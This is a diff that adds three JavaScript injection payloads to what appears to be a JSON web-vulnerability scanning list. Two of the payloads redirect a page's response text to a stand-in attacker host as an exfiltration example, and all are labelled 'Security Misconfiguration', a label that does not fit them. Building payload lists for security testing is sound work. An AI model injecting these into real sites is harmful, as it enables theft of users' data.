@@ -603,5 +603,38 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-214550",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "top.location=self.location;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Index of|exception|debug|server"
+    }
+  },
+  {
+    "payload_id": "OWP-215069",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "location='//attacker.net/log?key='+this.responseText;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Index of|exception|debug|server"
+    }
+  },
+  {
+    "payload_id": "OWP-215084",
+    "vulnerability_category": "Security Misconfiguration",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "Index of|exception|debug|server"
+    }
   }
 ]
